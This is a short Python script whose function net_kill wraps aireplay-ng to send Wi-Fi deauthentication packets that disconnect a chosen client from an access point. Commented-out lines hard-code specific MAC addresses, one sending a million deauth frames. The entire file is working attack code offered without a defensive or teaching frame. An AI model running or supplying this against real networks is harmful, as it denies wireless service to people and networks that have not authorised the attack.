import subprocess

def net_kill(target_mac, rmac, chn, iface):
    # cmd = 'aireplay-ng --deauth 1000000 -c E0:91:67:F8:0D:BD -a 70:0B:01:EC:52:F1 wlan0'
    cmd = f'aireplay-ng --deauth 10 -c {target_mac} -a {rmac} {iface}'

    process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
    #subprocess.run([f" aireplay-ng -0 15 -a C8:3A:35:11:70:90 -c {target_mac} wlan0 "],shell=True)
    output, error = process.communicate()
    print(output)
    print(error)
